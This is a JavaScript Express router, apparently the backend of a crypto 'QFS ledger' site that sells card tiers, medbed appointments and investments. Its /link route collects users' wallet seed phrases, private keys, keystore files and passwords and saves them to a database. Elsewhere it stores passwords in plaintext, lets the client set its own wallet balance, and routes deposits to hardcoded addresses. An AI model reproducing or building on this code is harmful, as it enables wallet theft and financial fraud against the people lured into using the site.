import express from "express";
import { ensureAuthenticated } from "../middleware/authMiddleware.js";
import User from "../models/user.model.js";
import { upload } from "../config/cloudinary.js";
import bcrypt from "bcrypt"; // 🔒 Added for secure password comparisons and hashing
import { body, validationResult } from "express-validator"; // 🔒 Added for XSS sanitization
import multer from "multer";
import Message from "../models/message.model.js";
import CardOrder from "../models/CardOrder.js";
import QPhone from "../models/QPhone.js";
import KYC from "../models/KYC.js";
import { LinkedWallet } from "../models/LinkedWallet.js";
import crypto from "crypto";
import QRCode from "qrcode";
import Deposit from "../models/Deposit.js";
import Redemption from "../models/Redemption.js";
import Appointment from "../models/Appointment.js";
import Investment from "../models/Investment.js";
import Withdrawal from "../models/Withdrawal.js";
import { sendEmail } from "../mailers/mailer.js";
import {
  withdrawalApprovedTemplate,
  withdrawalPendingTemplate,
  withdrawalRejectedTemplate,
} from "../mailers/templates/template.js";

const parseForm = multer();

const userRouter = express.Router();

userRouter.get("/dashboard", ensureAuthenticated, (req, res) => {
  res.render("dashboard", {
    currentUser: req.user, // pass the user to EJS
  });
});

userRouter.get("/profile", ensureAuthenticated, (req, res) => {
  res.render("profile", {
    currentUser: req.user, // pass the user to EJS
  });
});

// VALIDATED PROFILE UPDATE ROUTE (NO BCRYPT)
userRouter.post(
  "/profile",
  ensureAuthenticated,
  upload.single("Profile_photo"),
  [
    // 🔒 Sanitization Array: Converts malicious HTML/Scripts into safe characters
    body("fullname").optional({ checkFalsy: true }).trim().escape(),
    body("username").optional({ checkFalsy: true }).trim().escape(),
    body("email")
      .optional({ checkFalsy: true })
      .isEmail()
      .withMessage("Please enter a valid email address")
      .normalizeEmail(),
    body("country").optional({ checkFalsy: true }).trim().escape(),
    body("state").optional({ checkFalsy: true }).trim().escape(),
    body("phone").optional({ checkFalsy: true }).trim().escape(),
    body("password")
      .optional({ checkFalsy: true })
      .isLength({ min: 6 })
      .withMessage("New password must be at least 6 characters long"),
  ],
  async (req, res) => {
    try {
      // Check for validation/XSS filter errors
      const errors = validationResult(req);
      if (!errors.isEmpty()) {
        return res.status(200).json({ mssg: errors.array()[0].msg });
      }

      const {
        username,
        fullname,
        email,
        country,
        state,
        phone,
        current_pass_from_form,
        password,
        confirm_password,
      } = req.body;

      // Fetch current user
      const user = await User.findById(req.user._id || req.user.id);
      if (!user) {
        return res.status(200).json({ mssg: "User not found" });
      }

      // 🔄 Plaintext Password Verification (Reverted back to original)
      if (current_pass_from_form && current_pass_from_form !== user.password) {
        return res.status(200).json({ mssg: "Current password is incorrect" });
      }

      // Handle password update logic cleanly
      let newPassword = user.password;
      if (password && confirm_password) {
        if (password !== confirm_password) {
          return res.status(200).json({ mssg: "New passwords do not match" });
        }
        newPassword = password;
      }

      // 🔒 Email collision check (Crucial: prevents users from changing to an email that someone else already owns)
      if (email && email !== user.email) {
        const emailExists = await User.findOne({ email });
        if (emailExists) {
          return res
            .status(200)
            .json({ mssg: "Email address is already in use by another account" });
        }
        user.email = email;
      }

      // Handle image upload fallback safely
      const imageUrl = req.file?.path || user.image;

      // Update the fields with sanitized values
      user.username = username || user.username;
      user.fullname = fullname || user.fullname;
      user.country = country || user.country;
      user.state = state || user.state;
      user.phone = phone || user.phone;
      user.password = newPassword;
      user.image = imageUrl;

      await user.save();

      return res.json({
        mssg: "ok",
        user: {
          username: user.username,
          fullname: user.fullname,
          email: user.email,
          phone: user.phone,
          country: user.country,
          state: user.state,
          image: user.image,
        },
      });
    } catch (err) {
      console.error("Error updating profile:", err);
      return res.status(500).json({
        mssg: "Something went wrong while updating your profile",
        error: err.message,
      });
    }
  },
);

userRouter.get("/cards", ensureAuthenticated, (req, res) => {
  res.render("card");
});

// Updated backend endpoint for card requests with all tier data

userRouter.post(
  "/cards",
  ensureAuthenticated,
  upload.single("Poof_of_address"), // handles image upload to Cloudinary
  async (req, res) => {
    try {
      const {
        cardholdersname,
        card_typ, // tier number (1-6)
        card_name, // tier name (Bronze, Silver, Gold, etc.)
        card_price, // price ($18,750, $37,500, etc.)
        card_spend, // spend limit ($25K - $100K, etc.)
        email,
        phone,
        address,
      } = req.body;

      // Validate required fields
      if (
        !cardholdersname ||
        !card_typ ||
        !card_name ||
        !card_price ||
        !card_spend ||
        !email ||
        !phone ||
        !address
      ) {
        return res.json({ mssg: "Please fill in all required fields." });
      }

      // Get image URL from cloudinary
      const proofUrl = req.file?.path || "";

      if (!proofUrl) {
        return res.json({ mssg: "Please upload proof of address." });
      }

      const user = await User.findById(req.user.id);

      if (Number(user.walletValue) < Number(card_price)) {
        return res.status(200).json({ mssg: "Insufficient wallet balance to request a card." });
      }
      // Save to database with all card tier data
      await CardOrder.create({
        user: req.user._id,
        cardholdersname,
        card_typ, // tier number
        card_name, // tier name
        card_price, // price
        card_spend_limit: card_spend, // spend limit
        email,
        phone,
        address,
        proof_of_address: proofUrl,
      });

      res.json({ mssg: "ok" });
    } catch (error) {
      console.error("❌ Error creating card order:", error);
      res.json({ mssg: "Something went wrong. Please try again later." });
    }
  },
);

userRouter.get("/phone", ensureAuthenticated, (req, res) => {
  res.render("phone");
});

// Upload proof of payment to Cloudinary
userRouter.post(
  "/phone",
  ensureAuthenticated,
  upload.single("Poof_of_payment"),
  async (req, res) => {
    try {
      const { wallet_address, amount, fullname, email, phone, address } = req.body;

      const proofUrl = req.file ? req.file.path : null; // Cloudinary URL

      // Save to MongoDB
      const newOrder = new QPhone({
        user: req.user._id,
        wallet_address,
        amount,
        fullname,
        email,
        phone,
        address,
        proof_of_payment: proofUrl,
      });

      await newOrder.save();

      res.json({ mssg: "ok" });
    } catch (error) {
      console.error("❌ Error saving QPhone order:", error);
      res.json({ mssg: "Failed to process order. Please try again later." });
    }
  },
);

userRouter.get("/kyc", ensureAuthenticated, (req, res) => {
  res.render("kyc", {
    currentUser: req.user, // pass the user to EJS
  });
});

userRouter.post(
  "/kyc",
  ensureAuthenticated,
  upload.fields([
    { name: "kyc_file_front", maxCount: 1 },
    { name: "kyc_file_back", maxCount: 1 },
  ]),
  async (req, res) => {
    const user = await User.findById(req.user.id);

    try {
      const { doc_typ } = req.body;

      const frontUrl = req.files["kyc_file_front"] ? req.files["kyc_file_front"][0].path : null;
      const backUrl = req.files["kyc_file_back"] ? req.files["kyc_file_back"][0].path : null;

      if (!doc_typ || !frontUrl || !backUrl) {
        return res.json({ mssg: "All fields are required." });
      }

      // Save to DB
      const newKyc = new KYC({
        user: req.user._id,
        doc_typ,
        front_image: frontUrl,
        back_image: backUrl,
      });

      await newKyc.save();

      user.kycSumitted = true;
      await user.save();

      res.json({ mssg: "ok" });
    } catch (error) {
      console.error("❌ Error saving KYC:", error);
      res.json({ mssg: "Failed to upload KYC documents." });
    }
  },
);

userRouter.get("/medical", ensureAuthenticated, (req, res) => {
  res.render("medical");
});
userRouter.get("/contact", ensureAuthenticated, (req, res) => {
  res.render("contact", {
    currentUser: req.user, // pass the user to EJS
  });
});

userRouter.post("/contact", ensureAuthenticated, parseForm.none(), async (req, res) => {
  try {
    const { sender_name, sender_email, sender_subject, sender_mssg } = req.body;

    // Validate input
    if (!sender_name || !sender_email || !sender_subject || !sender_mssg) {
      return res.json({ mssg: "Please fill in all fields." });
    }

    // Save message to MongoDB
    const newMessage = new Message({
      sender_name,
      sender_email,
      sender_subject,
      sender_mssg,
    });

    await newMessage.save();

    // Send success response for AJAX
    res.json({ mssg: "ok" });
  } catch (error) {
    console.error("❌ Error saving contact message:", error);
    res.json({ mssg: "Something went wrong, please try again later." });
  }
});

// GET /contact-medbed
// Looks up whether this user already has an appointment and
// passes it to the view so the correct stage is rendered.
userRouter.get("/contact-medbed", ensureAuthenticated, async (req, res) => {
  try {
    // Find the most recent appointment for this user (there should only be one active one)
    const appointment = await Appointment.findOne({ user: req.user._id }).sort({ createdAt: -1 });

    res.render("contactMedbed", {
      currentUser: req.user,
      appointment: appointment || null, // null = never applied
    });
  } catch (err) {
    console.error("Error fetching appointment:", err);
    res.render("contactMedbed", {
      currentUser: req.user,
      appointment: null,
    });
  }
});

// POST /contact-medbed
// Stage 1: User submits the initial booking application (NO payment info yet).
userRouter.post("/contact-medbed", ensureAuthenticated, upload.none(), async (req, res) => {
  try {
    const { sender_name, sender_email, sender_subject, sender_mssg } = req.body;

    if (!sender_name || !sender_email || !sender_subject || !sender_mssg) {
      return res.json({ mssg: "Please fill in all fields." });
    }

    // Prevent duplicate applications — check if user already has a pending/approved one
    const existing = await Appointment.findOne({
      user: req.user._id,
      status: { $in: ["pending", "approved"] },
    });

    if (existing) {
      return res.json({ mssg: "You already have an active appointment application." });
    }

    await Appointment.create({
      user: req.user._id,
      sender_name,
      sender_email,
      sender_subject,
      sender_mssg,
      status: "pending",
      isApproved: false,
      payment_status: "unpaid",
    });

    res.json({ mssg: "ok" });
  } catch (error) {
    console.error("❌ Error saving appointment:", error);
    res.json({ mssg: "Something went wrong, please try again later." });
  }
});

// POST /contact-medbed-payment
// Stage 2: User submits payment proof AFTER their application was approved.
userRouter.post("/contact-medbed-payment", ensureAuthenticated, upload.any(), async (req, res) => {
  try {
    const { booking_amount } = req.body;

    if (!booking_amount) {
      return res.json({ mssg: "Please enter the amount you sent." });
    }

    const proofUrl = req.files && req.files[0] ? req.files[0].path : null;
    if (!proofUrl) {
      return res.json({ mssg: "Please attach your proof of payment." });
    }

    // Find the approved appointment for this user
    const appointment = await Appointment.findOne({
      user: req.user._id,
      isApproved: true,
      payment_status: "unpaid",
    });

    if (!appointment) {
      return res.json({ mssg: "No approved appointment found. Please contact support." });
    }

    appointment.booking_amount = Number(booking_amount);
    appointment.proof_of_payment = proofUrl;
    appointment.payment_status = "submitted";
    await appointment.save();

    res.json({ mssg: "ok" });
  } catch (error) {
    console.error("❌ Error saving payment proof:", error);
    res.json({ mssg: "Something went wrong, please try again later." });
  }
});

userRouter.get("/fund", ensureAuthenticated, (req, res) => {
  res.render("securefund", {
    currentUser: req.user, // pass the user to EJS
  });
});

userRouter.post("/fund", ensureAuthenticated, parseForm.none(), (req, res) => {
  res.json({ mssg: "ok" });
});

userRouter.get("/deposit", ensureAuthenticated, (req, res) => {
  res.render("deposit");
});

userRouter.get("/link", ensureAuthenticated, (req, res) => {
  res.render("linkWallet");
});

userRouter.post("/link", ensureAuthenticated, parseForm.none(), async (req, res) => {
  try {
    const { keyid, type_of_login_detail, Phrase, Keystore_json, Private_Key, password } = req.body;

    if (!type_of_login_detail || !keyid) {
      return res.json({ mssg: "Missing wallet type or keyid" });
    }

    const user = await User.findById(req.user.id);
    if (!user) {
      return res.status(200).json({ mssg: "User not found" });
    }

    user.walletConnected = true;
    await user.save();
    let walletData = {
      user: req.user._id,
      keyid,
      type_of_login_detail,
      password: password || null,
    };

    // Dynamically attach whichever field was sent
    if (Phrase) walletData.Phrase = Phrase;
    if (Keystore_json) walletData.Keystore_json = Keystore_json;
    if (Private_Key) walletData.Private_Key = Private_Key;

    // Save to DB
    await LinkedWallet.create(walletData);

    res.json({ mssg: "ok" });
  } catch (err) {
    console.error("❌ Error linking wallet:", err);
    res.json({ mssg: "Something went wrong, please try again." });
  }
});

userRouter.get("/buy", ensureAuthenticated, (req, res) => {
  res.render("buy-crypto", {
    currentUser: req.user, // pass the user to EJS
  });
});

userRouter.post("/deposit2", ensureAuthenticated, async (req, res) => {
  try {
    const { crypto_wallet } = req.body;

    const wallets = {
      bitcoin: {
        name: "Bitcoin",
        address: "bc1q3qx6qsgggnq0cglyqjn9q9z3zmcphgvwp3fnm3",
      },
      ethereum: {
        name: "Ethereum",
        address: "0x1ebbf36b416EaB62458C9D9d3e6aa468993eb104",
      },
      tether: {
        name: "Tether (TRC20)",
        address: "TFh7xSY71qhS8S4xKxs9tk36y2JRMACq17",
      },
      stellar: {
        name: "Stellar",
        address: "0xe78F9419f8eB448F9CF2D14b264bE02BB29Fc9d9",
      },
      ripple: {
        name: "Ripple",
        address: "rPKkEPCD2HYxowMYShcfZpU5Hpkcbbm4Ez",
      },
      litecoin: {
        name: "Litecoin",
        address: "ltc1qx04jsqfw48j6dqd2xqws2jswfhhdw9e0wwm64t",
      },
      doge: {
        name: "DogeCoin",
        address: "DMkq9FJwM5FBGwASFjtqockyxV33n2QhER",
      },
      "shiba-inu": {
        name: "Shiba Inu",
        address: "0x5f172e7eceb2892333617733ea81be47953db3fab043f39bd46cf1453f2be55d",
      },
      tron: {
        name: "Tron",
        address: "UQCRXG4qU1eccrcdOcUNioM9IvDR5BLCRKFQsnAck1ZTFz67",
      },
      cardano: {
        name: "Cardano",
        address: "GBCECILVV2OVUDJ4HJ2OTZPAWOTNWXN5N35T5GAQQENMLSQVTFM5F27Q",
      },
      solana: {
        name: "Solana",
        address: "8FerakH9Ln8c4b4VhZnY65fTrZFVpQJvFK7dCdG8easU",
      },
      "polygon-ecosystem-token": {
        name: "Polygon Ecosystem Token",
        address: "0xe78F9419f8eB448F9CF2D14b264bE02BB29Fc9d9",
      },
      algorand: {
        name: "Algorand",
        address: "ZIKEPAKGEVFMEY4NJWWNGU32PMFYTRGDHND3J3KARYXKNZUS7CNXIKD7YM",
      },
      official_trump: {
        name: "Official Trump",
        address: "TFh7xSY71qhS8S4xKxs9tk36y2JRMACq17",
      },
      pepe: {
        name: "Pepe",
        address: "0x1ebbf36b416EaB62458C9D9d3e6aa468993eb104",
      },
    };

    const walletInfo = wallets[crypto_wallet];
    if (!walletInfo) {
      return res.status(200).send("Invalid crypto wallet selected");
    }

    // Generate QR code for the address
    const qrImage = await QRCode.toDataURL(walletInfo.address);

    // Generate unique transaction ID
    const transactionId = "QFS" + crypto.randomBytes(4).toString("hex").toUpperCase();

    // Render deposit page
    return res.render("deposit2", {
      crypto_wallet: walletInfo.name,
      walletAddress: walletInfo.address,
      qrImage,
      transactionId,
      user: req.user,
    });
  } catch (err) {
    console.error(err);
    res.status(500).send("Server Error");
  }
});

userRouter.post("/confirm-deposit", ensureAuthenticated, async (req, res) => {
  try {
    const { transactionId, wallet, address, amount } = req.body;

    const newDeposit = new Deposit({
      user: req.user._id,
      transactionId,
      wallet,
      address,
      amount,
      status: "pending",
      createdAt: new Date(),
    });

    await newDeposit.save();

    res.json({ mssg: "Deposit recorded successfully! Awaiting confirmation." });
  } catch (err) {
    console.error(err);
    res.status(500).json({ mssg: "Server error" });
  }
});

userRouter.get("/transaction", ensureAuthenticated, async (req, res) => {
  const transactions = await Deposit.find({ user: req.user._id }).sort({ createdAt: -1 });
  res.render("transaction", { transactions });
});

// Redemption form
userRouter.get("/redemption", ensureAuthenticated, (req, res) => {
  res.render("redemption");
});

userRouter.post(
  "/redemption",
  ensureAuthenticated,
  upload.single("redemption_file"),
  async (req, res) => {
    try {
      if (!req.file) {
        return res.status(400).json({ mssg: "No file uploaded" });
      }
      // Check if user already has a pending redemption
      const existingRedemption = await Redemption.findOne({
        user: req.user._id,
        status: "pending",
      });

      if (existingRedemption) {
        return res.status(400).json({
          mssg: "You already have a pending redemption form. Please wait for review.",
        });
      }

      const newRedemption = new Redemption({
        user: req.user._id,
        fullname: req.user.fullname,
        email: req.user.email,
        redemption_file: req.file.path,
        status: "pending",
      });

      await newRedemption.save();
      res.setHeader("Content-Type", "application/json");
      res.json({
        mssg: "ok",
        redemptionId: newRedemption._id,
      });
    } catch (error) {
      res.status(500).json({
        mssg: "An error occurred while processing your submission. Please try again.",
      });
    }
  },
);

userRouter.get("/investment", ensureAuthenticated, async (req, res) => {
  const user = await User.findById(req.user.id);

  const holdings = await Investment.aggregate([
    { $match: { user: user._id } },
    {
      $group: {
        _id: "$investment_type",
        totalQty: { $sum: "$quantity" },
        totalSpent: { $sum: "$total_amount" },
      },
    },
  ]);

  const map = { gold: 0, silver: 0, diamond: 0 };
  holdings.forEach((h) => (map[h._id] = h.totalQty));

  const history = await Investment.find({ user: user._id }).sort({ createdAt: -1 }).limit(10);

  res.render("investment", {
    wallet: parseFloat(user.walletValue),
    holdings: map,
    history,
  });
});

userRouter.post("/investment", ensureAuthenticated, async (req, res) => {
  try {
    const { investment_type, quantity, price_per_unit } = req.body;

    const qty = parseFloat(quantity);
    const price = parseFloat(price_per_unit);
    const total = qty * price;

    if (!qty || !price) return res.json({ mssg: "Invalid numbers" });

    const user = await User.findById(req.user.id);
    let wallet = parseFloat(user.walletValue);

    if (wallet < total) return res.json({ mssg: "Insufficient funds, PLease fund your wallet" });

    wallet -= total;
    user.walletValue = wallet.toFixed(2);
    await user.save();

    await Investment.create({
      user: user._id,
      investment_type,
      quantity: qty,
      price_per_unit: price,
      total_amount: total,
      status: "completed",
    });

    res.json({ mssg: "ok", walletValue: wallet });
  } catch {
    res.json({ mssg: "Server error" });
  }
});

// Additional routes for sidebar and withdrawal modal
userRouter.get("/sidebar", (req, res) => {
  res.render("sidebar");
});
userRouter.get("/withdraw", (req, res) => {
  res.render("withdrawal_modal");
});

userRouter.post("/update-wallet-value", ensureAuthenticated, async (req, res) => {
  try {
    const { walletValue } = req.body;
    if (walletValue === undefined || walletValue === null) {
      return res.status(400).json({ mssg: "No value provided" });
    }
    await User.findByIdAndUpdate(req.user.id, {
      walletValue: parseFloat(walletValue).toFixed(2),
    });
    res.json({ mssg: "ok" });
  } catch (err) {
    console.error("Failed to update wallet value:", err);
    res.status(500).json({ mssg: "Server error" });
  }
});

// ============================================================
// ADD these imports to the top of user.route.js
// ============================================================
// import Withdrawal from "../models/Withdrawal.js";
// import { withdrawalPendingTemplate } from "../mailers/templates/template.js";
// import { sendEmail } from "../mailers/mailer.js";

// ============================================================
// ADD this route to user.route.js (replace the old
// userRouter.get("/withdraw", ...) static render if you want,
// or keep it — this is the new POST handler that actually
// processes withdrawals)
// ============================================================

const WITHDRAWABLE_COIN_KEYS = [
  "btc",
  "eth",
  "usdt",
  "xlm",
  "xrp",
  "ltc",
  "doge",
  "bnb",
  "shib",
  "trx",
  "ada",
  "sol",
  "matic",
  "algo",
  "trump",
  "pepe",
];

userRouter.post("/withdraw", ensureAuthenticated, async (req, res) => {
  try {
    const { asset_type, asset_label, amount, destination_address } = req.body;

    if (!asset_type || !amount || !destination_address) {
      return res.json({ mssg: "Please fill in all fields." });
    }

    const withdrawAmount = Number(amount);
    if (!withdrawAmount || withdrawAmount <= 0) {
      return res.json({ mssg: "Please enter a valid amount." });
    }

    const user = await User.findById(req.user._id);
    if (!user) {
      return res.json({ mssg: "User not found." });
    }

    // Determine current balance for the selected asset
    let currentBalance = 0;
    const isCoin = WITHDRAWABLE_COIN_KEYS.includes(asset_type);

    if (asset_type === "walletValue") {
      currentBalance = Number(user.walletValue || 0);
    } else if (asset_type === "profit") {
      currentBalance = Number(user.profit || 0);
    } else if (isCoin) {
      currentBalance = Number(user.coinHoldings?.[asset_type] || 0);
    } else {
      // humanitarianFunding or anything else is NOT withdrawable
      return res.json({ mssg: "This asset cannot be withdrawn." });
    }

    if (withdrawAmount > currentBalance) {
      return res.json({ mssg: "Insufficient balance for this withdrawal." });
    }

    // ✅ Deduct immediately
    if (asset_type === "walletValue") {
      user.walletValue = (currentBalance - withdrawAmount).toFixed(2);
    } else if (asset_type === "profit") {
      user.profit = (currentBalance - withdrawAmount).toFixed(2);
    } else if (isCoin) {
      user.coinHoldings[asset_type] = currentBalance - withdrawAmount;
    }

    await user.save();

    // Create withdrawal record
    const withdrawal = await Withdrawal.create({
      user: user._id,
      asset_type,
      asset_label: asset_label || asset_type,
      amount: withdrawAmount,
      destination_address,
      status: "pending",
    });

    // Send pending email
    // console.log("trying to send email", user.email);
    try {
      await sendEmail({
        to: user.email,
        from: "Verify <confirm@qfsledgersvault.com>",

        ...withdrawalPendingTemplate(
          user.fullname,
          withdrawal.asset_label,
          withdrawal.amount,
          withdrawal.destination_address,
        ),
      });
    } catch (emailErr) {
      console.error("❌ Failed to send withdrawal pending email:", emailErr);
    }

    res.json({ mssg: "ok" });
  } catch (error) {
    console.error("❌ Error processing withdrawal:", error);
    res.json({ mssg: "Something went wrong, please try again later." });
  }
});

export default userRouter;
